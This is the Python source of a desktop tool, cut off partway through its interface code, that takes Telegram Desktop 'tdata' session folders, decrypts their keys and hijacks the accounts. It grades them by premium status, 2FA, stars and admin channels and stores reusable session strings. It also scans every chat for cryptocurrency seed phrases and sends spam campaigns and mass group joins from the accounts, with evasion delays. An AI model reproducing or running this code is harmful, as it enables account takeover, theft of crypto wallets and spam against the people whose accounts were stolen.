"""TData processing engine for TSP68 Checker."""

import customtkinter as ctk
from tkinter import filedialog, messagebox
import tkinter as tk
import threading, asyncio, json, sqlite3, os, sys, time, random, re
from pathlib import Path
from datetime import datetime
from typing import Optional, List, Dict, Tuple, Set
import webbrowser
from dataclasses import dataclass, asdict, field
import shutil
from concurrent.futures import ThreadPoolExecutor, as_completed
import traceback, logging, struct, hashlib

try:
    from telethon import TelegramClient, functions, types, errors
    from telethon.tl.functions.channels import GetFullChannelRequest, JoinChannelRequest
    from telethon.sessions import StringSession
    from opentele.td import TDesktop
    from opentele.api import API, UseCurrentSession
    import tgcrypto
except ImportError:
    raise ImportError("Missing dependencies: pip install telethon opentele tgcrypto customtkinter Pillow python-socks")

APP_NAME = "TDataTools"
VERSION = "3.0.0"
APPDATA = Path(os.getenv('APPDATA', '.')) / APP_NAME
for d in [APPDATA, APPDATA/"sessions", APPDATA/"hits", APPDATA/"results"]:
    d.mkdir(exist_ok=True)
DB_PATH = APPDATA / "database.db"
API_ID, API_HASH = 2040, "b18441a1ff607e106cf94440b6d2746a"

logging.basicConfig(level=logging.INFO, format='%(asctime)s %(levelname)s %(message)s',
    handlers=[logging.FileHandler(APPDATA/"app.log"), logging.StreamHandler()])
logger = logging.getLogger(__name__)

LANG = {
  'en': {
    'checker': 'Checker', 'accounts': 'Accounts', 'messenger': 'Messenger', 'finder': 'Finder',
    'select_folder': 'Select TData Folder', 'start': 'START', 'stop': 'STOP',
    'threads': 'Threads', 'passcode': 'Passcode', 'deep_scan': 'Deep Scan',
    'total': 'Total', 'valid': 'Valid', 'invalid': 'Invalid', '2fa': '2FA',
    'proxy_file': 'Proxy File', 'export': 'Export', 'clear': 'Clear',
    'select_account': 'Select Account', 'message': 'Message', 'send': 'SEND',
    'add_photo': 'Add Photo', 'cooldown': 'Cooldown (min)', 'typing_delay': 'Typing (s)',
    'fetch_groups': 'Fetch Groups', 'join_groups': 'Join Groups', 'group_urls': 'Group URLs',
    'target_groups': 'Target Groups', 'download': 'Download TData',
    'filter_premium': 'Premium Only', 'filter_has_chats': 'Has Chats', 'filter_no_spam': 'No Spam',
    'scan_mnemonics': 'Scan Mnemonics', 'results': 'Results', 'no_accounts': 'No accounts',
    'checker_info': '📊 Select a folder containing TData directories and click START to check accounts.',
    'accounts_info': '👤 View and manage checked accounts. Click an account for details. Use filters to narrow results.',
    'messenger_info': '✉️ Select accounts, set target groups, write a message and send. Use cooldown to avoid spam limits.',
    'finder_info': '🔍 Scan valid account chats for seed phrases (12/24 word mnemonics). Select accounts and click Scan.',
    'language': 'Language', 'details': 'Details', 'phone': 'Phone', 'username': 'Username',
    'premium': 'Premium', 'spam': 'Spam Limited', 'dialogs': 'Dialogs', 'bio': 'Bio',
    'admin_channels': 'Admin Channels', 'session_string': 'Session String', 'copy': 'Copy',
    'stars': 'Stars', 'account_id': 'ID', 'name': 'Name',
    'join_cooldown': 'Join interval (s)', 'joining': 'Joining groups...',
    'accounts_select': 'Select accounts for messaging',
  },
  'ru': {
    'checker': 'Проверка', 'accounts': 'Аккаунты', 'messenger': 'Рассылка', 'finder': 'Поиск',
    'select_folder': 'Выбрать папку', 'start': 'СТАРТ', 'stop': 'СТОП',
    'threads': 'Потоки', 'passcode': 'Пароль', 'deep_scan': 'Глубокий скан',
    'total': 'Всего', 'valid': 'Живые', 'invalid': 'Мёртвые', '2fa': '2FA',
    'checker_info': '📊 Выберите папку с TData и нажмите СТАРТ для проверки.',
    'accounts_info': '👤 Просмотр аккаунтов. Нажмите для деталей.',
    'messenger_info': '✉️ Выберите аккаунты и группы, напишите сообщение.',
    'finder_info': '🔍 Поиск сид-фраз в чатах.',
    'language': 'Язык',
  },
  'de': {
    'checker': 'Prüfer', 'accounts': 'Konten', 'messenger': 'Nachrichten', 'finder': 'Suche',
    'select_folder': 'Ordner wählen', 'start': 'START', 'stop': 'STOPP',
    'language': 'Sprache',
    'checker_info': '📊 Wählen Sie einen TData-Ordner und klicken Sie auf START.',
  },
  'it': {
    'checker': 'Controllo', 'accounts': 'Account', 'messenger': 'Messaggi', 'finder': 'Ricerca',
    'select_folder': 'Seleziona cartella', 'start': 'AVVIA', 'stop': 'FERMA',
    'language': 'Lingua',
    'checker_info': '📊 Seleziona una cartella TData e clicca AVVIA.',
  },
  'ar': {
    'checker': 'الفحص', 'accounts': 'الحسابات', 'messenger': 'الرسائل', 'finder': 'البحث',
    'select_folder': 'اختر المجلد', 'start': 'ابدأ', 'stop': 'توقف',
    'language': 'اللغة',
    'checker_info': '📊 اختر مجلد TData واضغط ابدأ للفحص.',
  },
  'tr': {
    'checker': 'Kontrol', 'accounts': 'Hesaplar', 'messenger': 'Mesajlar', 'finder': 'Arama',
    'select_folder': 'Klasör Seç', 'start': 'BAŞLAT', 'stop': 'DURDUR',
    'threads': 'İş Parçacığı', 'passcode': 'Şifre', 'deep_scan': 'Derin Tarama',
    'total': 'Toplam', 'valid': 'Geçerli', 'invalid': 'Geçersiz',
    'language': 'Dil',
    'checker_info': '📊 TData klasörünü seçin ve BAŞLAT\'a tıklayın.',
    'accounts_info': '👤 Hesapları görüntüleyin. Detaylar için tıklayın.',
    'messenger_info': '✉️ Hesap ve grup seçin, mesajınızı yazın.',
    'finder_info': '🔍 Geçerli hesaplarda tohum cümle tarayın.',
  },
  'id': {
    'checker': 'Pemeriksa', 'accounts': 'Akun', 'messenger': 'Pesan', 'finder': 'Pencari',
    'select_folder': 'Pilih Folder', 'start': 'MULAI', 'stop': 'BERHENTI',
    'language': 'Bahasa',
    'checker_info': '📊 Pilih folder TData dan klik MULAI untuk memeriksa.',
  },
}
LANG_LABELS = {'en':'🇬🇧 English','ru':'🇷🇺 Русский','de':'🇩🇪 Deutsch','it':'🇮🇹 Italiano',
               'ar':'🇸🇦 العربية','tr':'🇹🇷 Türkçe','id':'🇮🇩 Indonesia'}

@dataclass
class AccountInfo:
    phone: Optional[str] = None
    user_id: Optional[int] = None
    username: Optional[str] = None
    first_name: Optional[str] = None
    last_name: Optional[str] = None
    bio: Optional[str] = None
    is_valid: bool = False
    is_premium: bool = False
    is_spam_limited: bool = False
    is_terminated: bool = False
    has_2fa: bool = False
    stars_balance: int = 0
    admin_channels: List[Dict] = field(default_factory=list)
    total_dialogs: int = 0
    session_string: Optional[str] = None
    tdata_path: Optional[str] = None
    dc_id: Optional[int] = None
    last_checked: datetime = field(default_factory=datetime.now)
    error_message: Optional[str] = None

class DB:
    def __init__(self):
        self._lock = threading.Lock()
        self._local = threading.local()
        self._init()

    @property
    def conn(self):
        if not hasattr(self._local, 'c'):
            self._local.c = sqlite3.connect(DB_PATH, timeout=30, check_same_thread=False)
            self._local.c.row_factory = sqlite3.Row
        return self._local.c

    def _init(self):
        c = sqlite3.connect(DB_PATH)
        c.execute('''CREATE TABLE IF NOT EXISTS accounts(
            id INTEGER PRIMARY KEY, phone TEXT, user_id INTEGER UNIQUE, username TEXT,
            first_name TEXT, last_name TEXT, bio TEXT, is_premium INT DEFAULT 0,
            is_spam INT DEFAULT 0, is_terminated INT DEFAULT 0, has_2fa INT DEFAULT 0,
            stars INT DEFAULT 0, admin_channels TEXT, total_dialogs INT DEFAULT 0,
            session_string TEXT, tdata_path TEXT, dc_id INT, status TEXT DEFAULT 'unchecked',
            error TEXT, checked_at TIMESTAMP, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
        c.execute('''CREATE TABLE IF NOT EXISTS settings(key TEXT PRIMARY KEY, value TEXT)''')
        c.execute("CREATE INDEX IF NOT EXISTS idx_uid ON accounts(user_id)")
        c.execute("CREATE INDEX IF NOT EXISTS idx_st ON accounts(status)")
        # Migrate old database schemas
        # Step 1: Rename old column names first
        renames = [
            ('is_spam_limited', 'is_spam'),
            ('error_message', 'error'),
            ('last_checked', 'checked_at'),
            ('balance', 'stars'),
        ]
        try:
            cols = [r[1] for r in c.execute("PRAGMA table_info(accounts)").fetchall()]
            for old, new in renames:
                if old in cols and new not in cols:
                    try: c.execute(f"ALTER TABLE accounts RENAME COLUMN {old} TO {new}")
                    except: pass
        except: pass
        # Step 2: Add any missing columns
        needed = [
            ('is_spam', 'INT DEFAULT 0'), ('has_2fa', 'INT DEFAULT 0'),
            ('stars', 'INT DEFAULT 0'), ('error', 'TEXT'),
            ('checked_at', 'TIMESTAMP'), ('created_at', 'TIMESTAMP DEFAULT CURRENT_TIMESTAMP'),
            ('dc_id', 'INT'), ('bio', 'TEXT'), ('is_terminated', 'INT DEFAULT 0'),
            ('admin_channels', 'TEXT'), ('total_dialogs', 'INT DEFAULT 0'),
            ('session_string', 'TEXT'), ('tdata_path', 'TEXT'), ('is_premium', 'INT DEFAULT 0'),
            ('status', "TEXT DEFAULT 'unchecked'"), ('username', 'TEXT'),
            ('first_name', 'TEXT'), ('last_name', 'TEXT'),
        ]
        for col, typ in needed:
            try: c.execute(f"ALTER TABLE accounts ADD COLUMN {col} {typ}")
            except: pass
        for k, v in {'language':'en','theme':'dark','threads':'5','deep_scan':'1'}.items():
            c.execute("INSERT OR IGNORE INTO settings VALUES(?,?)", (k, v))
        c.commit(); c.close()

    def get(self, key, default=None):
        r = self.conn.execute("SELECT value FROM settings WHERE key=?", (key,)).fetchone()
        return r['value'] if r else default

    def set(self, key, val):
        with self._lock:
            self.conn.execute("INSERT OR REPLACE INTO settings VALUES(?,?)", (key, val))
            self.conn.commit()

    def add_account(self, a: AccountInfo) -> int:
        with self._lock:
            status = 'invalid' if not a.is_valid else ('hit' if a.is_premium or a.admin_channels else 'valid')
            cur = self.conn.cursor()
            cur.execute("SELECT id FROM accounts WHERE user_id=?", (a.user_id,))
            ex = cur.fetchone()
            if ex:
                cur.execute('''UPDATE accounts SET phone=?,username=?,first_name=?,last_name=?,bio=?,
                    is_premium=?,is_spam=?,is_terminated=?,has_2fa=?,stars=?,admin_channels=?,
                    total_dialogs=?,session_string=?,tdata_path=?,dc_id=?,status=?,error=?,checked_at=?
                    WHERE user_id=?''', (a.phone,a.username,a.first_name,a.last_name,a.bio,
                    int(a.is_premium),int(a.is_spam_limited),int(a.is_terminated),int(a.has_2fa),
                    a.stars_balance,json.dumps(a.admin_channels),a.total_dialogs,a.session_string,
                    a.tdata_path,a.dc_id,status,a.error_message,a.last_checked,a.user_id))
                aid = ex['id']
            else:
                cur.execute('''INSERT INTO accounts(phone,user_id,username,first_name,last_name,bio,
                    is_premium,is_spam,is_terminated,has_2fa,stars,admin_channels,total_dialogs,
                    session_string,tdata_path,dc_id,status,error,checked_at)
                    VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)''',
                    (a.phone,a.user_id,a.username,a.first_name,a.last_name,a.bio,
                    int(a.is_premium),int(a.is_spam_limited),int(a.is_terminated),int(a.has_2fa),
                    a.stars_balance,json.dumps(a.admin_channels),a.total_dialogs,a.session_string,
                    a.tdata_path,a.dc_id,status,a.error_message,a.last_checked))
                aid = cur.lastrowid
            self.conn.commit()
            return aid

    def get_accounts(self, status=None, filters=None):
        q = "SELECT * FROM accounts"
        params = []
        clauses = []
        if status:
            clauses.append("status IN ({})".format(','.join('?' * len(status.split(',')))))
            params.extend(status.split(','))
        if filters:
            if filters.get('premium'):
                clauses.append("is_premium=1")
            if filters.get('has_chats'):
                clauses.append("total_dialogs>0")
            if filters.get('no_spam'):
                clauses.append("is_spam=0")
        if clauses:
            q += " WHERE " + " AND ".join(clauses)
        q += " ORDER BY id DESC"
        return self.conn.execute(q, params).fetchall()

    def get_stats(self):
        c = self.conn.cursor()
        s = {}
        s['total'] = c.execute("SELECT COUNT(*) c FROM accounts").fetchone()['c']
        s['valid'] = c.execute("SELECT COUNT(*) c FROM accounts WHERE status IN('valid','hit')").fetchone()['c']
        s['invalid'] = c.execute("SELECT COUNT(*) c FROM accounts WHERE status='invalid'").fetchone()['c']
        s['2fa'] = c.execute("SELECT COUNT(*) c FROM accounts WHERE has_2fa=1").fetchone()['c']
        return s

    def clear(self):
        with self._lock:
            self.conn.execute("DELETE FROM accounts"); self.conn.commit()

# MANUAL TDATA READER (working version from v2.1.1)
class ManualTDataReader:
    DC = {1:("149.154.175.53",443),2:("149.154.167.51",443),3:("149.154.175.100",443),
          4:("149.154.167.91",443),5:("91.108.56.130",443)}

    @staticmethod
    def _read_tdf(fp):
        raw = Path(fp).read_bytes()
        if len(raw)<24: raise ValueError("Too small")
        if raw[:4]!=b'TDF$': raise ValueError("Not TDF")
        ver = struct.unpack('<i',raw[4:8])[0]
        # Auto-detect MD5 region
        md5s = raw[-16:]
        for s in range(0,min(24,len(raw)-16)):
            if hashlib.md5(raw[s:-16]).digest()==md5s:
                return raw[max(s,8):-16], ver
        return raw[8:-16], ver  # fallback

    @staticmethod
    def _read_qba(d,p):
        if p+4>len(d): raise ValueError("QBA overflow")
        sz=struct.unpack('>i',d[p:p+4])[0]; p+=4
        if sz<0: return b'',p
        if p+sz>len(d): raise ValueError("QBA too large")
        return d[p:p+sz],p+sz

    @staticmethod
    def _aes_old(k,m):
        def s(*p):
            h=hashlib.sha1()
            for x in p: h.update(x)
            return h.digest()
        a=s(m,k[8:40]); b=s(k[40:56],m,k[56:72]); c=s(k[72:104],m); d=s(m,k[104:136])
        return a[:8]+b[8:20]+c[4:16], a[8:20]+b[:8]+c[16:20]+d[:8]

    @staticmethod
    def _aes_new(k,m):
        def s(*p):
            h=hashlib.sha256()
            for x in p: h.update(x)
            return h.digest()
        a=s(m,k[8:44]); b=s(k[48:80],m)
        return a[:8]+b[8:24]+a[24:32], b[:8]+a[8:24]+b[24:32]

    @classmethod
    def _try_dec(cls, enc, key):
        if len(enc)<=16 or len(enc)%16: return None
        mk=enc[:16]; body=enc[16:]
        for fn in (cls._aes_old, cls._aes_new):
            try:
                ak,iv=fn(key,mk)
                d=tgcrypto.ige256_decrypt(body,ak,iv)
                if len(d)<4: continue
                ln=struct.unpack('<i',d[:4])[0]
                if ln<0 or ln>len(d)-4: continue
                if 32<=ln<=4096: return d[4:4+ln]
            except: continue
        return None

    def extract(self, tdata_path, log_fn=None, passcode=""):
        log=log_fn or (lambda m,l='info':None)
        td=Path(tdata_path); pb=passcode.encode()if passcode else b''
        kf=None
        for n in['key_datas','key_data']:
            if(td/n).exists(): kf=td/n; break
        if not kf: raise FileNotFoundError("No key_datas")

        raw=kf.read_bytes()
        # Try multiple payload interpretations
        payloads=[]
        try: p,_=self._read_tdf(str(kf)); payloads.append(p)
        except: pass
        payloads.append(raw[8:-16]); payloads.append(raw[8:])
        if len(raw)>28: payloads.append(raw[4:-16])

        local_key=None
        for payload in payloads:
            if len(payload)<72: continue
            try:
                pos=0; salt,pos=self._read_qba(payload,pos)
                key_enc,pos=self._read_qba(payload,pos)
            except: continue
            if not(16<=len(salt)<=64 and 32<=len(key_enc)<=1024): continue

            for sv in[salt, salt[1:]if len(salt)>1 else salt]:
                for ha in['sha512','sha256','sha1']:
                    # Fast iterations first (no passcode)
                    for it in[1,4]:
                        try:
                            pk=hashlib.pbkdf2_hmac(ha,b'',sv,it,256)
                            dec=self._try_dec(key_enc,pk)
                            if dec and len(dec)>=256:
                                local_key=dec[:256]
                                log(f"   ✅ Key decrypted ({ha}/{it})", "success")
                                break
                        except: continue
                    if local_key: break
                    # Slow iterations only if passcode provided
                    if pb:
                        for it in[100000,4000]:
                            for pw in [pb, b'']:
                                try:
                                    pk=hashlib.pbkdf2_hmac(ha,pw,sv,it,256)
                                    dec=self._try_dec(key_enc,pk)
                                    if dec and len(dec)>=256:
                                        local_key=dec[:256]
                                        log(f"   ✅ Key decrypted ({ha}/{it}/pw)", "success")
                                        break
                                except: continue
                            if local_key: break
                    if local_key: break
                if local_key: break
            if local_key: break

        if not local_key:
            raise ValueError("Cannot decrypt key_datas - PASSCODE PROTECTED or unsupported version")

        # Find auth keys in hex dirs
        results=[]
        for item in sorted(td.iterdir()):
            if not item.is_dir(): continue
            base=item.name.rstrip('s').split('#')[0]
            if len(base)==16 and all(c in'0123456789ABCDEFabcdef'for c in base):
                r=self._scan_dir(item, local_key)
                if r: results.append(r)
        return results

    def _scan_dir(self, d, key):
        # Try map files first
        for mn in['maps0','maps1','map0','map1']:
            mp=d/mn
            if not mp.exists(): continue
            try:
                dec=self._dec_tdf(mp,key)
                if dec is None: continue
                r=self._parse_map(dec,d,key)
                if r: return r
            except: continue
        # Brute force
        for f in sorted(d.iterdir()):
            if not f.is_file() or f.name.startswith('map'): continue
            if f.stat().st_size<40 or f.stat().st_size>100000: continue
            try:
                dec=self._dec_tdf(f,key)
                if dec is None: continue
                r=self._find_auth(dec)
                if r: return r
            except: continue
        return None

    def _dec_tdf(self, fp, key):
        try: payload,_=self._read_tdf(str(fp))
        except: payload=fp.read_bytes()[8:]
        try: enc,_=self._read_qba(payload,0)
        except: return None
        return self._try_dec(enc,key)

    def _parse_map(self, data, d, key):
        pos=0
        while pos+20<=len(data):
            kt=struct.unpack('<I',data[pos:pos+4])[0]; pos+=4
            if kt==0: break
            if pos+16>len(data): break
            fk=data[pos:pos+16]; pos+=16
            if pos+4<=len(data): pos+=4
            fn=fk.hex().upper()[:16]
            for sx in['s','']:
                fp=d/(fn+sx)
                if not fp.exists(): continue
                try:
                    dec=self._dec_tdf(fp,key)
                    if dec is None: continue
                    r=self._find_auth(dec)
                    if r: return r
                except: continue
        return None

    def _find_auth(self, data):
        if len(data)<260: return None
        def ok(k): return len(k)==256 and k!=b'\x00'*256 and len(set(k))>=30
        for dco in(0,4,8):
            if dco+4>len(data): continue
            dc=struct.unpack('<i',data[dco:dco+4])[0]
            if not(1<=dc<=5): continue
            for ks in range(dco+4,min(dco+24,len(data)-255),4):
                ak=data[ks:ks+256]
                if ok(ak): return(ak,dc)
        return None

    def to_session(self, ak, dc):
        ss=StringSession()
        ip,port=self.DC.get(dc,("149.154.167.51",443))
        ss.set_dc(dc,ip,port)
        ss.auth_key=type('AK',(),{'key':ak})()
        return ss.save()

class TDataProcessor:
    def __init__(self, log_cb=None):
        self.log = log_cb or (lambda m,l='info':print(m))
        self.stop = threading.Event()

    def find_tdata(self, root, deep=True):
        found=set(); rp=Path(root)
        def is_td(p): return(p/"key_datas").exists()or any(p.glob("key_data*"))
        try:
            if is_td(rp): found.add(str(rp.resolve()))
            if deep:
                for i in rp.rglob("*"):
                    if self.stop.is_set(): break
                    if i.is_dir()and is_td(i): found.add(str(i.resolve()))
        except(PermissionError,OSError): pass
        return sorted(found)

    async def check_async(self, tdata_path, check_premium=True, check_spam=True,
                          check_admin=True, proxy=None, passcode=""):
        a = AccountInfo(tdata_path=tdata_path)
        client = None; temp_s = None
        try:
            # Try opentele first
            tdesk = None
            try:
                tdesk = TDesktop(tdata_path)
                if not tdesk.isLoaded(): tdesk = None
            except: tdesk = None

            if tdesk and tdesk.isLoaded():
                temp_s = str(APPDATA/"sessions"/f"t_{int(time.time())}_{random.randint(1000,9999)}.session")
                client = await tdesk.ToTelethon(session=temp_s, flag=UseCurrentSession, api=API.TelegramDesktop)
                client.flood_sleep_threshold = 0
                if proxy: client.set_proxy(proxy)
                await asyncio.wait_for(client.connect(), timeout=15)
                if not await client.is_user_authorized():
                    a.error_message="Not authorized"; return a
                me = await client.get_me()
            else:
                # Manual reader fallback
                reader = ManualTDataReader()
                pairs = reader.extract(tdata_path, log_fn=self.log, passcode=passcode)
                if not pairs:
                    a.error_message="No auth keys found"; return a
                ak, dc = pairs[0]
                ss = reader.to_session(ak, dc)
                client = TelegramClient(StringSession(ss), API_ID, API_HASH,
                    device_model="Desktop", system_version="Windows 10", app_version="4.16.4",
                    proxy=proxy, connection_retries=1, retry_delay=1, timeout=10)
                client.flood_sleep_threshold = 0
                await asyncio.wait_for(client.connect(), timeout=15)
                if not await client.is_user_authorized():
                    a.error_message="Not authorized"; return a
                me = await client.get_me()
                a.session_string = ss

            a.user_id=me.id; a.phone=f"+{me.phone}"if me.phone else None
            a.username=me.username; a.first_name=me.first_name
            a.last_name=me.last_name; a.dc_id=getattr(client.session,'dc_id',None)
            a.is_valid=True

            # Terminated check
            try: await client.get_entity('me')
            except(errors.UserDeactivatedError,errors.UserDeactivatedBanError):
                a.is_terminated=True; a.is_valid=False; a.error_message="Terminated"; return a

            # Bio
            try:
                full=await client(functions.users.GetFullUserRequest(me))
                a.bio=full.full_user.about
            except: pass

            # Premium
            if check_premium: a.is_premium=bool(getattr(me,'premium',False))

            # 2FA
            try:
                pwd=await client(functions.account.GetPasswordRequest())
                a.has_2fa=pwd.has_password
            except: pass

            # Spam check
            if check_spam:
                try:
                    if hasattr(me,'restricted')and me.restricted: a.is_spam_limited=True
                    else: await client.get_dialogs(limit=1)
                except errors.FloodWaitError: a.is_spam_limited=True
                except: pass

            # Admin channels
            if check_admin:
                try:
                    dlgs=await asyncio.wait_for(client.get_dialogs(limit=None), timeout=15)
                    a.total_dialogs=len(dlgs)
                    for d in dlgs:
                        if not(d.is_channel or d.is_group): continue
                        e=d.entity
                        if hasattr(e,'admin_rights')and e.admin_rights:
                            try:
                                fc=await client(GetFullChannelRequest(e))
                                mc=getattr(fc.full_chat,'participants_count',0)
                            except: mc=0
                            a.admin_channels.append({'title':d.title,'members':mc,
                                'username':getattr(e,'username',None)})
                except: pass
            elif not a.total_dialogs:
                try: a.total_dialogs=len(await client.get_dialogs(limit=None))
                except: pass

            # Session string
            if not a.session_string:
                try:
                    ss=StringSession()
                    ss.set_dc(client.session.dc_id,client.session.server_address,client.session.port)
                    ss.auth_key=client.session.auth_key
                    a.session_string=ss.save()
                except: pass

        except BaseException as e:
            a.error_message=str(e)[:200]
        finally:
            if client and client.is_connected():
                try: await client.disconnect()
                except: pass
            if temp_s:
                for ext in['','.journal']:
                    p=Path(temp_s+ext)
                    if p.exists():
                        try: p.unlink()
                        except: pass
        return a

    def check_sync(self, path, **kw):
        loop=asyncio.new_event_loop(); asyncio.set_event_loop(loop)
        try:
            # 30 second max per account
            return loop.run_until_complete(
                asyncio.wait_for(self.check_async(path,**kw), timeout=30)
            )
        except asyncio.TimeoutError:
            a=AccountInfo(tdata_path=path); a.error_message="Timeout (30s)"; return a
        except BaseException as e:
            a=AccountInfo(tdata_path=path); a.error_message=str(e)[:200]; return a
        finally:
            try: loop.close()
            except: pass

# MNEMONIC FINDER
class MnemonicFinder:
    LENGTHS = {12, 15, 18, 21, 24}
    VOWELS = set('aeiou')

    @staticmethod
    def is_mnemonic_candidate(words):
        """Strict mnemonic validation to eliminate false positives."""
        if len(words) not in MnemonicFinder.LENGTHS: return False
        
        for w in words:
            if not w.isalpha() or not w.islower(): return False
            if not (3 <= len(w) <= 8): return False
            # Must contain at least one vowel (eliminates "krlo", "brdg")
            if not any(c in MnemonicFinder.VOWELS for c in w): return False
            # No triple repeated characters (eliminates "shuruuu", "abbb")
            for i in range(len(w) - 2):
                if w[i] == w[i+1] == w[i+2]: return False
            # No double repeated characters (eliminates "abbb", "bccdd" patterns)
            double_count = sum(1 for i in range(len(w)-1) if w[i]==w[i+1])
            if double_count > 1: return False
        
        # At least 80% unique words (real mnemonics rarely repeat)
        if len(set(words)) < len(words) * 0.8: return False
        
        # Average word length should be 4-6 (BIP39 average is ~5)
        avg = sum(len(w) for w in words) / len(words)
        if avg < 3.5 or avg > 7: return False
        
        return True

    @staticmethod
    def scan_text(text):
        """Find potential mnemonic phrases in text."""
        hits = []
        # Split by common separators, normalize
        text_clean = re.sub(r'[^a-zA-Z\s]', ' ', text.lower())
        words = text_clean.split()
        # Filter out very short/long words early
        words = [w for w in words if 3 <= len(w) <= 8 and w.isalpha()]
        
        for ln in sorted(MnemonicFinder.LENGTHS, reverse=True):
            if len(words) < ln: continue
            for i in range(len(words) - ln + 1):
                chunk = words[i:i+ln]
                if MnemonicFinder.is_mnemonic_candidate(chunk):
                    phrase = ' '.join(chunk)
                    if phrase not in hits:
                        hits.append(phrase)
        return hits

    @staticmethod
    async def scan_account(session_str, log_fn=None, limit=100):
        """Scan an account's chats for mnemonics."""
        log = log_fn or (lambda m,l='info':None)
        results = []
        client = None
        try:
            client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
            await client.connect()
            me = await client.get_me()
            log(f"🔍 Scanning {me.phone or me.id}...", "info")

            dialogs = await client.get_dialogs(limit=None)
            for dlg in dialogs:
                try:
                    msgs = await client.get_messages(dlg, limit=limit)
                    for msg in msgs:
                        if not msg.text: continue
                        hits = MnemonicFinder.scan_text(msg.text)
                        for h in hits:
                            results.append({
                                'phone': me.phone, 'user_id': me.id,
                                'chat': dlg.title or str(dlg.id),
                                'phrase': h, 'msg_id': msg.id,
                                'date': str(msg.date)
                            })
                            log(f"💎 FOUND in {dlg.title}: {h[:40]}...", "success")
                except: continue
        except Exception as e:
            log(f"❌ Scan error: {e}", "error")
        finally:
            if client and client.is_connected():
                try: await client.disconnect()
                except: pass
        return results

# AUTO MESSENGER
class AutoMessenger:
    def __init__(self, log_cb=None):
        self.log = log_cb or (lambda m,l='info':print(m))
        self.stop = threading.Event()

    async def send_campaign(self, session_str, groups, message, photo=None,
                           cooldown=60, typing_sec=3, proxy=None):
        client=None
        try:
            client=TelegramClient(StringSession(session_str),API_ID,API_HASH,
                device_model="Desktop",system_version="Windows 10",app_version="4.16.4",
                proxy=proxy)
            await client.connect()
            me=await client.get_me()
            self.log(f"🚀 Campaign: {me.phone or me.id}","info")

            for idx,grp in enumerate(groups):
                if self.stop.is_set(): break
                try:
                    entity=await client.get_entity(grp)
                    try: await client(JoinChannelRequest(entity))
                    except: pass
                    async with client.action(entity,'typing'):
                        await asyncio.sleep(typing_sec+random.uniform(0.5,2))
                    if photo and Path(photo).exists():
                        try: await client.send_file(entity,photo,caption=message)
                        except: await client.send_message(entity,message)
                    else: await client.send_message(entity,message)
                    self.log(f"✅ Sent → {grp}","success")
                    if idx<len(groups)-1:
                        w=cooldown*60+random.randint(-30,30)
                        self.log(f"⏰ Wait {w//60}m","info")
                        for _ in range(w):
                            if self.stop.is_set(): break
                            await asyncio.sleep(1)
                except errors.FloodWaitError as e:
                    self.log(f"⚠️ Flood: {e.seconds}s","warning")
                    for _ in range(e.seconds):
                        if self.stop.is_set(): break
                        await asyncio.sleep(1)
                except Exception as e:
                    self.log(f"❌ {grp}: {str(e)[:60]}","error")
            self.log("✅ Campaign done!","success")
        except Exception as e:
            self.log(f"❌ {e}","error")
        finally:
            if client and client.is_connected(): await client.disconnect()

    async def join_groups(self, session_str, urls, interval=300, proxy=None):
        client=None
        try:
            client=TelegramClient(StringSession(session_str),API_ID,API_HASH,proxy=proxy)
            await client.connect()
            for i,url in enumerate(urls):
                if self.stop.is_set(): break
                try:
                    url=url.strip()
                    if not url: continue
                    # Detect invite links: t.me/+xxx, t.me/joinchat/xxx
                    if 'joinchat/' in url:
                        h=url.split('joinchat/')[-1].split('?')[0].strip()
                        await client(functions.messages.ImportChatInviteRequest(h))
                    elif '/+' in url or url.startswith('+'):
                        h=url.split('+')[-1].split('?')[0].strip()
                        await client(functions.messages.ImportChatInviteRequest(h))
                    else:
                        uname=url.split('/')[-1].split('?')[0].replace('@','').strip()
                        if not uname: continue
                        entity=await client.get_entity(uname)
                        await client(JoinChannelRequest(entity))
                    self.log(f"✅ Joined {url}","success")
                except errors.UserAlreadyParticipantError:
                    self.log(f"ℹ️ Already in {url}","info")
                except errors.FloodWaitError as e:
                    self.log(f"⚠️ Flood: {e.seconds}s","warning")
                    await asyncio.sleep(e.seconds)
                except Exception as e:
                    self.log(f"❌ {url}: {str(e)[:50]}","error")
                if i<len(urls)-1:
                    self.log(f"⏰ Wait {interval}s","info")
                    for _ in range(interval):
                        if self.stop.is_set(): break
                        await asyncio.sleep(1)
            self.log("✅ Group join done!","success")
        except Exception as e:
            self.log(f"❌ {e}","error")
        finally:
            if client and client.is_connected(): await client.disconnect()

    async def fetch_groups(self, session_str):
        client=None; groups=[]
        try:
            client=TelegramClient(StringSession(session_str),API_ID,API_HASH)
            await client.connect()
            for d in await client.get_dialogs(limit=None):
                if d.is_group or d.is_channel:
                    groups.append({'id':d.id,'title':d.title,
                        'username':getattr(d.entity,'username',None),
                        'members':getattr(d.entity,'participants_count',0)})
        except: pass
        finally:
            if client and client.is_connected(): await client.disconnect()
        return groups

class App(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.db = DB()
        self.proc = TDataProcessor(log_cb=self.log_hit)
        self.msgr = AutoMessenger(log_cb=self.add_msg_log)
        self.lang_code = self.db.get('language','en')
        self.checking = False
        self._check_lock = threading.Lock()
        self.selected_folders = []
        self.selected_photo = None
        self.proxy_file = None
        self.found_mnemonics = []

        self.title(f"TDataTools v{VERSION}")
        self.geometry("1400x850")
        ctk.set_appearance_mode("dark")
        ctk.set_default_color_theme("blue")

        self._build()
        self._show_tab('checker')

    def t(self, key):
        return LANG.get(self.lang_code, LANG['en']).get(key, LANG['en'].get(key, key))

    # ── UI BUILD ──────────────────────────────────────────────────
    def _build(self):
        self.grid_rowconfigure(0, weight=1)
        self.grid_columnconfigure(1, weight=1)

        # Sidebar
        self.sidebar = ctk.CTkFrame(self, width=200, corner_radius=0)
        self.sidebar.grid(row=0, column=0, sticky="nsew")
        self.sidebar.grid_rowconfigure(6, weight=1)

        ctk.CTkLabel(self.sidebar, text="TDataTools", font=ctk.CTkFont(size=24, weight="bold")
            ).grid(row=0, column=0, padx=15, pady=(25,0))
        ctk.CTkLabel(self.sidebar, text=f"v{VERSION}", text_color="gray", font=ctk.CTkFont(size=11)
            ).grid(row=1, column=0, pady=(0,25))

        self.tab_btns = {}
        for i, (key, icon) in enumerate([('checker','📊'),('accounts','👤'),('messenger','✉️'),('finder','🔍')]):
            btn = ctk.CTkButton(self.sidebar, text=f"{icon} {self.t(key)}", height=42,
                font=ctk.CTkFont(size=14, weight="bold"), fg_color="transparent", border_width=2,
